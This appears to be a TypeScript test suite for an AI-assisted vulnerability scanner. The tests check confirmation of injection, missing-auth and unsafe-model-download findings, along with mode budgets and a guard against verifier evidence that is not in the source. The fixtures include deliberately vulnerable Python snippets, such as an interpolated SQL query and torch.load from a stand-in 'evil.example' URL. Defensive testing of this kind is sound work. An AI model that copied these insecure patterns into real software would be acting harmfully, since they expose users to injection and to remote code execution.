// ===================================================================
// PHASE 4. Rule-family deterministic confirmation
// (cursor_instructions.pdf §7, Phase 4 / required-tests §10.5)

function gapCand(over: Partial<GapAuditCandidate>): GapAuditCandidate {
  return {
    candidate_title: over.candidate_title ?? "candidate",
    rule_family: over.rule_family ?? "unknown",
    source_kind: over.source_kind ?? "request",
    sink_kind: over.sink_kind ?? "unknown",
    file: over.file ?? "f.py",
    line: over.line ?? 1,
    evidence: over.evidence ?? "",
    why_missed: over.why_missed ?? "",
    confidence: over.confidence ?? 0.8,
    needs_deterministic_confirmation: true,
  }
}

test("P4. command injection: source->command sink with no guard is confirmed", () => {
  const dir = mkproject({ "app.py": VULN_FILE })
  try {
    const res = confirmCandidate({
      candidate: gapCand({ rule_family: "command-execution", sink_kind: "os.system", file: "app.py", line: 4 }),
      projectPath: dir,
      existingFindings: [],
    })
    assert.equal(res.status, "confirmed")
  } finally {
    fs.rmSync(dir, { recursive: true, force: true })
  }
})

test("P4. command injection: a shlex.quote guard rejects the candidate", () => {
  const guarded = [
    "import os, shlex",
    "def handler(req):",
    "    cmd = req.args.get('cmd')",
    "    os.system('echo ' + shlex.quote(cmd))",
    "    return 'ok'",
  ].join("\n")
  const dir = mkproject({ "g.py": guarded })
  try {
    const res = confirmCandidate({
      candidate: gapCand({ rule_family: "command-execution", sink_kind: "os.system", file: "g.py", line: 4 }),
      projectPath: dir,
      existingFindings: [],
    })
    assert.equal(res.status, "rejected_guard_present")
  } finally {
    fs.rmSync(dir, { recursive: true, force: true })
  }
})

test("P4. SQL injection: interpolated query reaching execute is confirmed", () => {
  const sqlVuln = [
    "def get_user(req):",
    "    q = f\"SELECT * FROM users WHERE id = {req.args.get('id')}\"",
    "    cursor.execute(q)",
    "    return q",
  ].join("\n")
  const dir = mkproject({ "db.py": sqlVuln })
  try {
    const res = confirmCandidate({
      candidate: gapCand({ rule_family: "sql-injection", sink_kind: "execute", file: "db.py", line: 3 }),
      projectPath: dir,
      existingFindings: [],
    })
    assert.equal(res.status, "confirmed")
  } finally {
    fs.rmSync(dir, { recursive: true, force: true })
  }
})

test("P4. SQL injection: a parameterized query is not confirmed", () => {
  const sqlSafe = [
    "def get_user(req):",
    "    cursor.execute('SELECT * FROM users WHERE id = %s', (req.args.get('id'),))",
    "    return 'ok'",
  ].join("\n")
  const dir = mkproject({ "db.py": sqlSafe })
  try {
    const res = confirmCandidate({
      candidate: gapCand({ rule_family: "sql-injection", sink_kind: "execute", file: "db.py", line: 2 }),
      projectPath: dir,
      existingFindings: [],
    })
    assert.equal(res.status, "rejected_guard_present")
  } finally {
    fs.rmSync(dir, { recursive: true, force: true })
  }
})

test("P4. prompt injection: untrusted content into instruction prompt is confirmed", () => {
  const promptVuln = [
    "def build(req):",
    "    prompt = f\"Answer the question: {req.args.get('q')}\"",
    "    return prompt",
  ].join("\n")
  const dir = mkproject({ "p.py": promptVuln })
  try {
    const res = confirmCandidate({
      candidate: gapCand({ rule_family: "prompt-injection", sink_kind: "prompt", file: "p.py", line: 2 }),
      projectPath: dir,
      existingFindings: [],
    })
    assert.equal(res.status, "confirmed")
  } finally {
    fs.rmSync(dir, { recursive: true, force: true })
  }
})

test("P4. auth: mutating route without a guard is confirmed; with @login_required it is rejected", () => {
  const noAuth = [
    "@app.post('/users/delete')",
    "def delete_user(req):",
    "    db.delete(req.args.get('id'))",
    "    return 'ok'",
  ].join("\n")
  const guarded = [
    "@app.post('/users/delete')",
    "@login_required",
    "def delete_user(req):",
    "    db.delete(req.args.get('id'))",
    "    return 'ok'",
  ].join("\n")
  const dir = mkproject({ "open.py": noAuth, "safe.py": guarded })
  try {
    const open = confirmCandidate({
      candidate: gapCand({ rule_family: "missing-auth", sink_kind: "auth", file: "open.py", line: 3 }),
      projectPath: dir,
      existingFindings: [],
    })
    assert.equal(open.status, "confirmed")
    const safe = confirmCandidate({
      candidate: gapCand({ rule_family: "missing-auth", sink_kind: "auth", file: "safe.py", line: 4 }),
      projectPath: dir,
      existingFindings: [],
    })
    assert.equal(safe.status, "rejected_guard_present")
  } finally {
    fs.rmSync(dir, { recursive: true, force: true })
  }
})

test("P4. vague prompt: prompt + deterministic missing-contract evidence is confirmed", () => {
  const dir = mkproject({ "vp.py": 'system_prompt = "Help the user."\n' })
  try {
    const ok = confirmCandidate({
      candidate: gapCand({
        rule_family: "vague-prompts",
        sink_kind: "prompt",
        file: "vp.py",
        line: 1,
        evidence: "missing role, task, output format, and approval policy",
      }),
      projectPath: dir,
      existingFindings: [],
    })
    assert.equal(ok.status, "confirmed")
    const weak = confirmCandidate({
      candidate: gapCand({
        rule_family: "vague-prompts",
        sink_kind: "prompt",
        file: "vp.py",
        line: 1,
        evidence: "the prompt seems a little short",
      }),
      projectPath: dir,
      existingFindings: [],
    })
    assert.equal(weak.status, "needs_human_review")
  } finally {
    fs.rmSync(dir, { recursive: true, force: true })
  }
})

test("P4. supply-chain: torch.load from http source confirmed; from_pretrained name is not", () => {
  const risky = 'import torch\nmodel = torch.load("http://evil.example/model.pkl")\n'
  const safe = 'from transformers import AutoModel\nmodel = AutoModel.from_pretrained("bert-base-uncased")\n'
  const dir = mkproject({ "risky.py": risky, "safe.py": safe })
  try {
    const r = confirmCandidate({
      candidate: gapCand({ rule_family: "model-download", sink_kind: "model_download", file: "risky.py", line: 2 }),
      projectPath: dir,
      existingFindings: [],
    })
    assert.equal(r.status, "confirmed")
    const s = confirmCandidate({
      candidate: gapCand({ rule_family: "model-download", sink_kind: "model_download", file: "safe.py", line: 2 }),
      projectPath: dir,
      existingFindings: [],
    })
    assert.notEqual(s.status, "confirmed")
    assert.equal(s.status, "needs_rule_support")
  } finally {
    fs.rmSync(dir, { recursive: true, force: true })
  }
})

// ===================================================================
// PHASE 5. Mode metrics + labeled fixtures
// (cursor_instructions.pdf §10.7 / Phase 5)

/** A mixed report: 2 risky high, 2 benign medium, 2 benign low, all in
 *  distinct files so they form 6 distinct clusters. */
function mixedReport(): { report: Record<string, unknown>; dir: string } {
  const files: Record<string, string> = {}
  const findings: ScanFinding[] = []
  for (let i = 0; i < 2; i++) {
    files[`hi${i}.py`] = VULN_FILE
    findings.push(finding({ id: `hi${i}`, severity: "high", file: `hi${i}.py`, line: 4 }))
  }
  for (let i = 0; i < 2; i++) {
    files[`med${i}.py`] = "x = 1\n"
    findings.push(
      finding({
        id: `med${i}`,
        severity: "medium",
        rule_id: "openapi-schema",
        category: "api",
        confidence: 0.9,
        file: `med${i}.py`,
        line: 1,
      }),
    )
  }
  for (let i = 0; i < 2; i++) {
    files[`lo${i}.py`] = "y = 2\n"
    findings.push(
      finding({
        id: `lo${i}`,
        severity: "low",
        rule_id: "accuracy-regression-risk",
        category: "accuracy",
        confidence: 0.95,
        file: `lo${i}.py`,
        line: 1,
      }),
    )
  }
  const dir = mkproject(files)
  return { report: { findings }, dir }
}

test("P5. intelligence_summary exposes per-mode metrics", async () => {
  _clearScanCacheForTests()
  const { report, dir } = mixedReport()
  const llm = fakeLlm({ verdict: "real" })
  const restore = _setScanFetcherForTests(llm.fetcher)
  try {
    await withOpenAiKey(async () => {
      const out = await enhanceScanReport(report, { projectPath: dir, mode: "deep" })
      const s = out.intelligence_summary as Record<string, unknown>
      for (const key of [
        "candidate_clusters",
        "selected_clusters",
        "verified_real",
        "likely_false_positive",
        "needs_human_review",
        "gap_candidates",
        "gap_confirmed",
        "gap_rejected",
        "budget_exhausted",
      ]) {
        assert.ok(key in s, `summary should expose ${key}`)
      }
      assert.equal(s.candidate_clusters, 6)
    })
  } finally {
    _setScanFetcherForTests(restore)
    fs.rmSync(dir, { recursive: true, force: true })
  }
})

test("P5. Balanced verifies least, Deep more, Exhaustive most, Lite zero", async () => {
  const selectedFor = async (mode: "lite" | "balanced" | "deep" | "exhaustive") => {
    _clearScanCacheForTests()
    const { report, dir } = mixedReport()
    const llm = fakeLlm({ verdict: "real" })
    const restore = _setScanFetcherForTests(llm.fetcher)
    try {
      return await withOpenAiKey(async () => {
        const out = await enhanceScanReport(report, { projectPath: dir, mode })
        const s = out.intelligence_summary as { selected_clusters: number; ai_calls_used: number }
        return s
      })
    } finally {
      _setScanFetcherForTests(restore)
      fs.rmSync(dir, { recursive: true, force: true })
    }
  }
  const lite = await selectedFor("lite")
  const balanced = await selectedFor("balanced")
  const deep = await selectedFor("deep")
  const exhaustive = await selectedFor("exhaustive")
  assert.equal(lite.ai_calls_used, 0)
  assert.equal(balanced.selected_clusters, 2)
  assert.equal(deep.selected_clusters, 4)
  assert.equal(exhaustive.selected_clusters, 6)
  assert.ok(
    balanced.selected_clusters < deep.selected_clusters &&
      deep.selected_clusters < exhaustive.selected_clusters,
    "selection widens with mode",
  )
})

test("P5. labeled fixtures: true positive verified, false positive downranked, missed issue confirmed", async () => {
  // (a) TRUE POSITIVE — real source->sink, verifier agrees.
  {
    _clearScanCacheForTests()
    const dir = mkproject({ "app.py": VULN_FILE })
    const llm = fakeLlm({ verdict: "real" })
    const restore = _setScanFetcherForTests(llm.fetcher)
    try {
      await withOpenAiKey(async () => {
        const report = { findings: [finding({ id: "tp" })] } as Record<string, unknown>
        const out = await enhanceScanReport(report, { projectPath: dir, mode: "balanced" })
        const f = (out.findings as ScanFinding[]).find((x) => x.id === "tp")
        assert.equal(f?.status, "llm_verified")
        const s = out.intelligence_summary as { verified_real: number }
        assert.ok(s.verified_real >= 1)
      })
    } finally {
      _setScanFetcherForTests(restore)
      fs.rmSync(dir, { recursive: true, force: true })
    }
  }
  // (b) FALSE POSITIVE — verifier downranks but never deletes.
  {
    _clearScanCacheForTests()
    const dir = mkproject({ "log.py": "def h(req):\n    print(req.args.get('x'))\n" })
    const llm = fakeLlm({ verdict: "likely_false_positive" })
    const restore = _setScanFetcherForTests(llm.fetcher)
    try {
      await withOpenAiKey(async () => {
        const report = { findings: [finding({ id: "fp", file: "log.py", line: 2 })] } as Record<string, unknown>
        const out = await enhanceScanReport(report, { projectPath: dir, mode: "balanced" })
        const findings = out.findings as ScanFinding[]
        const f = findings.find((x) => x.id === "fp")
        assert.ok(f, "false positive finding must NOT be deleted")
        assert.equal(f?.status, "likely_false_positive")
        const s = out.intelligence_summary as { likely_false_positive: number }
        assert.ok(s.likely_false_positive >= 1)
      })
    } finally {
      _setScanFetcherForTests(restore)
      fs.rmSync(dir, { recursive: true, force: true })
    }
  }
  // (c) MISSED ISSUE — gap candidate confirmed deterministically.
  {
    _clearScanCacheForTests()
    const dir = mkproject({ "app.py": VULN_FILE })
    const candidate = gapCand({
      rule_family: "command-execution",
      sink_kind: "os.system",
      file: "app.py",
      line: 4,
      evidence: "os.system(cmd)",
    })
    const llm = fakeLlm({ verdict: "real", candidates: [candidate] })
    const restore = _setScanFetcherForTests(llm.fetcher)
    try {
      await withOpenAiKey(async () => {
        const report = {
          findings: [],
          tools_detected: [{ name: "handler", file: "app.py", line: 2 }],
        } as Record<string, unknown>
        const out = await enhanceScanReport(report, { projectPath: dir, mode: "deep" })
        const gap = (out.findings as ScanFinding[]).find((f) => f.status === "gap_audit_confirmed")
        assert.ok(gap, "missed issue should be confirmed as gap_audit_confirmed")
        const s = out.intelligence_summary as { gap_confirmed: number; gap_candidates: number }
        assert.equal(s.gap_confirmed, 1)
        assert.ok(s.gap_candidates >= 1)
      })
    } finally {
      _setScanFetcherForTests(restore)
      fs.rmSync(dir, { recursive: true, force: true })
    }
  }
})

// ===================================================================
// CLEANUP 1. changedFiles (branch diff / working tree) priority wiring

test("CL1. changedFilesFromReport harvests path-bearing working_tree fields", () => {
  // No working_tree => undefined.
  assert.equal(changedFilesFromReport({}), undefined)
  // working_tree with only COUNTS (no paths) => undefined.
  assert.equal(
    changedFilesFromReport({ working_tree: { clean: false, modified: 3, untracked: 2, total: 5 } }),
    undefined,
  )
  // Path-bearing fields are collected (stash_files + attributed paths +
  // opportunistic modified/untracked arrays).
  const set = changedFilesFromReport({
    working_tree: {
      clean: false,
      stash_files: ["a.py", "b.py"],
      modified_files: ["c.py"],
      untracked_attributed_other_branches: [{ path: "d.py", branch: "x" }],
    },
  })
  assert.ok(set)
  assert.deepEqual([...set!].sort(), ["a.py", "b.py", "c.py", "d.py"])
})

test("CL1. a changed file outranks an equal-risk unchanged file", () => {
  const unchanged = cluster1({ id: "u", severity: "high", file: "unchanged.py" })
  const changed = cluster1({ id: "c", severity: "high", file: "changed.py" })
  const ctx = { changedFiles: new Set(["changed.py"]) }
  // Equal risk otherwise => the changed file scores strictly higher.
  assert.ok(priorityScore(changed, ctx) > priorityScore(unchanged, ctx))
  // And selection orders it first.
  const ordered = selectClustersForMode([unchanged, changed], "exhaustive", ctx)
  assert.equal(ordered[0].representative.id, "c")
})

test("CL1. enhanceScanReport threads working_tree changed files into selection", async () => {
  _clearScanCacheForTests()
  // Two equal high-severity findings; only one file is "changed".
  const dir = mkproject({ "changed.py": VULN_FILE, "unchanged.py": VULN_FILE })
  const llm = fakeLlm({ verdict: "real" })
  const restore = _setScanFetcherForTests(llm.fetcher)
  try {
    await withOpenAiKey(async () => {
      const report = {
        findings: [
          finding({ id: "unchanged", file: "unchanged.py", line: 4 }),
          finding({ id: "changed", file: "changed.py", line: 4 }),
        ],
        working_tree: { clean: false, modified_files: ["changed.py"] },
      } as Record<string, unknown>
      const out = await enhanceScanReport(report, { projectPath: dir, mode: "deep" })
      // Both reviewed, scan succeeds, and the changed-file finding is verified
      // (selection ran with the changed-files context, no crash).
      const findings = out.findings as ScanFinding[]
      const changed = findings.find((f) => f.id === "changed")
      assert.equal(changed?.status, "llm_verified")
      const s = out.intelligence_summary as { selected_clusters: number }
      assert.equal(s.selected_clusters, 2)
    })
  } finally {
    _setScanFetcherForTests(restore)
    fs.rmSync(dir, { recursive: true, force: true })
  }
})

// ===================================================================
// CLEANUP 2. Stricter verifier invented-evidence guard

test("CL2. exact-substring evidence is accepted", () => {
  const ctx = "def handler(req):\n    os.system(req.args.get('cmd'))"
  const r = coerceVerifierReply(
    {
      verdict: "real",
      confidence: 0.9,
      evidence_used: ["os.system(req.args.get('cmd'))"],
      suggested_status: "llm_verified",
    },
    ctx,
  )
  assert.equal(r.verdict, "real")
})

test("CL2. fully fabricated evidence is rejected (coerced to uncertain)", () => {
  const ctx = "def handler(req):\n    os.system(req.args.get('cmd'))"
  const r = coerceVerifierReply(
    { verdict: "real", evidence_used: ["a hardcoded sshd backdoor on port 31337"] },
    ctx,
  )
  assert.equal(r.verdict, "uncertain")
})

test("CL2. a partially-overlapping fabricated sentence is rejected", () => {
  // Shares some tokens with the context (system, value) but introduces
  // tokens that never appear (sanitized, allowlist) and is not a substring.
  const ctx = "def handler(req):\n    os.system(req.args.get('cmd'))"
  const r = coerceVerifierReply(
    {
      verdict: "likely_false_positive",
      evidence_used: ["the os.system value is sanitized via an allowlist"],
    },
    ctx,
  )
  assert.equal(r.verdict, "uncertain")
})

// ===================================================================
// CLEANUP 3. confirmationFamily SQL/command routing

test("CL3. 'execute command' routes to command_injection, not SQL", () => {
  const c = gapCand({ rule_family: "execute command", sink_kind: "command" })
  assert.equal(confirmationFamily(c), "command_injection")
})

test("CL3. 'cursor.execute SQL query' routes to sql_injection", () => {
  const c = gapCand({ rule_family: "sql query", sink_kind: "cursor.execute", source_kind: "request" })
  assert.equal(confirmationFamily(c), "sql_injection")
})

test("CL3. 'session.run Cypher query' routes to sql_injection", () => {
  const c = gapCand({ rule_family: "cypher query", sink_kind: "session.run", source_kind: "request" })
  assert.equal(confirmationFamily(c), "sql_injection")
})

test("CL3. bare 'execute' (no DB signal) is NOT classified as SQL", () => {
  const c = gapCand({ rule_family: "mystery", sink_kind: "execute", source_kind: "input" })
  assert.notEqual(confirmationFamily(c), "sql_injection")
})

// ===================================================================
// POLISH 1. Verifier evidence guard: decisive verdicts need EXACT evidence

test("F1. exact copied code evidence is accepted for a decisive verdict", () => {
  const ctx = "def handler(req):\n    os.system(req.args.get('cmd'))"
  const r = coerceVerifierReply(
    { verdict: "real", confidence: 0.9, evidence_used: ["os.system(req.args.get('cmd'))"] },
    ctx,
  )
  assert.equal(r.verdict, "real")
  assert.equal(r.suggested_status, "llm_verified")
})

test("F1. an exact file:line code-fact (path + line both present) is accepted", () => {
  // The fact is NOT a contiguous substring; it is a file:line code-fact whose
  // path and line both appear in the context (as bundle headers do).
  const ctx = "file: app.py (line 4)\n    os.system(cmd)"
  const r = coerceVerifierReply({ verdict: "real", evidence_used: ["app.py:4"] }, ctx)
  assert.equal(r.verdict, "real")
})

test("F1. fully fabricated evidence becomes uncertain/needs_human_review", () => {
  const ctx = "def handler(req):\n    os.system(req.args.get('cmd'))"
  const r = coerceVerifierReply(
    { verdict: "real", evidence_used: ["an undocumented telnet backdoor on port 23"] },
    ctx,
  )
  assert.equal(r.verdict, "uncertain")
  assert.equal(r.suggested_status, "needs_human_review")
})

test("F1. stitched sentence fails even when ALL its tokens appear in context", () => {
  // Every significant token (request, value, system, reaches) occurs in the
  // context, but the contiguous phrase does not. The old fuzzy fallback would
  // have ACCEPTED this; the exact-only guard must reject it.
  const ctx = "the user request reaches os.system and the value is logged"
  const r = coerceVerifierReply(
    { verdict: "real", evidence_used: ["request value system reaches"] },
    ctx,
  )
  assert.equal(r.verdict, "uncertain")
  assert.equal(r.suggested_status, "needs_human_review")
})

test("F1. decisive verdict with non-traceable evidence is coerced to uncertain", () => {
  const ctx = "def handler(req):\n    os.system(req.args.get('cmd'))"
  const r = coerceVerifierReply(
    { verdict: "likely_false_positive", evidence_used: ["the call is wrapped in a sandbox"] },
    ctx,
  )
  assert.equal(r.verdict, "uncertain")
  assert.equal(r.suggested_status, "needs_human_review")
})

// ===================================================================
// POLISH 2. changedFiles path normalization

test("F2. normalizeRelPath canonicalizes separators, ./ and duplicate slashes", () => {
  assert.equal(normalizeRelPath("src\\agent.py"), "src/agent.py")
  assert.equal(normalizeRelPath("./src/agent.py"), "src/agent.py")
  assert.equal(normalizeRelPath("src//agent.py"), "src/agent.py")
  assert.equal(normalizeRelPath("././src/agent.py"), "src/agent.py")
  assert.equal(normalizeRelPath("src/agent.py"), "src/agent.py")
  // Absolute without a root => null (never guess).
  assert.equal(normalizeRelPath("/abs/src/agent.py"), null)
  // Absolute inside the root => relativized.
  assert.equal(normalizeRelPath("/repo/src/agent.py", "/repo"), "src/agent.py")
  assert.equal(normalizeRelPath("/repo/src/agent.py", "/repo/"), "src/agent.py")
  // Absolute outside the root => null.
  assert.equal(normalizeRelPath("/other/src/agent.py", "/repo"), null)
  // Empty / non-string => null.
  assert.equal(normalizeRelPath(""), null)
  assert.equal(normalizeRelPath(42), null)
})

test("F2. changed-file matching is normalization-insensitive", () => {
  const changed = changedFilesFromReport({
    working_tree: { clean: false, modified_files: ["src\\agent.py", "./lib//util.py"] },
  })
  assert.ok(changed)
  assert.deepEqual([...changed!].sort(), ["lib/util.py", "src/agent.py"])

  const ctx = { changedFiles: changed! }
  const unchanged = cluster1({ id: "u", severity: "high", file: "other/thing.py" })
  // Cluster spelled with forward slashes matches the windows-style entry.
  const changedFwd = cluster1({ id: "c1", severity: "high", file: "src/agent.py" })
  // Cluster spelled with a leading ./ also matches after normalization.
  const changedDot = cluster1({ id: "c2", severity: "high", file: "./src/agent.py" })
  assert.ok(priorityScore(changedFwd, ctx) > priorityScore(unchanged, ctx))
  assert.ok(priorityScore(changedDot, ctx) > priorityScore(unchanged, ctx))
  // Unrelated paths get no changed-file bonus (equal to no-context score).
  assert.equal(priorityScore(unchanged, ctx), priorityScore(unchanged, {}))
})

// ===================================================================
// POLISH 3. Escalated verifier results are cached and reused

test("F3. escalated verifier result is cached and reused (no extra AI calls)", async () => {
  _clearScanCacheForTests()
  const dir = mkproject({ "app.py": VULN_FILE })
  // Balanced: cheap base -> mid escalation (distinct OpenAI models). An
  // uncertain verdict on a high finding forces escalation.
  const llm1 = fakeLlm({ verdict: "uncertain" })
  let restore = _setScanFetcherForTests(llm1.fetcher)
  try {
    await withOpenAiKey(async () => {
      const report = { findings: [finding({ id: "esc", severity: "high" })] } as Record<string, unknown>
      const out1 = await enhanceScanReport(report, { projectPath: dir, mode: "balanced" })
      const s1 = out1.intelligence_summary as { ai_calls_used: number }
      assert.ok(llm1.verifierCalls >= 2, "expected base + escalation verifier calls")
      const distinct = new Set(llm1.models)
      assert.ok(distinct.size >= 2, "base and escalate models must differ")
      assert.ok(s1.ai_calls_used >= 2)
    })
  } finally {
    _setScanFetcherForTests(restore)
  }

  // Second scan: SAME context/model/mode, cache intentionally NOT cleared.
  const llm2 = fakeLlm({ verdict: "uncertain" })
  restore = _setScanFetcherForTests(llm2.fetcher)
  try {
    await withOpenAiKey(async () => {
      const report = { findings: [finding({ id: "esc", severity: "high" })] } as Record<string, unknown>
      const out2 = await enhanceScanReport(report, { projectPath: dir, mode: "balanced" })
      const s2 = out2.intelligence_summary as { ai_calls_used: number }
      // Base verifier, escalation, AND gap audit are all served from cache.
      assert.equal(llm2.verifierCalls, 0, "verifier fully served from cache")
      assert.equal(llm2.gapCalls, 0, "gap audit fully served from cache")
      assert.equal(s2.ai_calls_used, 0, "cached escalation must not spend AI calls")
    })
  } finally {
    _setScanFetcherForTests(restore)
    fs.rmSync(dir, { recursive: true, force: true })
  }
})

test("F3. cached escalation still respects the AI-call budget", async () => {
  _clearScanCacheForTests()
  const dir = mkproject({ "app.py": VULN_FILE })
  const llm = fakeLlm({ verdict: "uncertain" })
  const restore = _setScanFetcherForTests(llm.fetcher)
  try {
    await withOpenAiKey(async () => {
      const report = { findings: [finding({ id: "esc", severity: "high" })] } as Record<string, unknown>
      const out = await enhanceScanReport(report, { projectPath: dir, mode: "balanced" })
      const s = out.intelligence_summary as { ai_calls_used: number }
      assert.ok(s.ai_calls_used <= 8, "balanced budget (8) is never exceeded")
    })
  } finally {
    _setScanFetcherForTests(restore)
    fs.rmSync(dir, { recursive: true, force: true })
  }
})
